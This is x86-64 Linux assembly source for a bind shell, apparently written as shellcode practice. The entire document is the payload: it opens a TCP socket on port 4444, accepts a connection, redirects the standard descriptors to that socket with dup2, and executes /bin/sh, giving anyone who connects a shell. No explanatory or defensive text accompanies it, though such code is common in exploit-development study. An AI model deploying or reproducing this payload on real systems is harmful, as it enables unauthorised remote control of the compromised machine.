global _start

section .text
_start:
    ;; struct sockaddr
    mov     rbp, rsp
    push    qword 0
    push    qword 0
    push    word 0x5c11
    push    word 0x02
    
    ;; socket()
    mov     rdi, 2
    mov     rsi, 1
    mov     rdx, 0
    mov     rax, 41
    syscall
    
    ;; sock_fd
    mov     rdi, rax
    ;; bind()
    mov     rsi, rsp
    mov     rdx, rbp
    sub     rdx, rsp
    mov     rax, 49
    syscall
    
    ;; listen()
    xor     rsi, rsi
    mov     rax, 50
    syscall
    
    ;; accept()
    xor     rdx, rdx
    mov     rax, 43
    syscall
    
    ;; clnt_fd
    mov     rdi, rax
    xor     r8, r8
    ;; dup2()
dup:
    mov     rsi, r8
    mov     rax, 33
    syscall
    inc     r8
    cmp     r8, 3
    jne     dup
    
    ;; execve()
    xor     rsi, rsi
    xor     rdx, rdx
    mov     rdi, exec
    mov     rax, 59
    syscall
    
    
section .data
    exec:   db  "/bin/sh",0
    
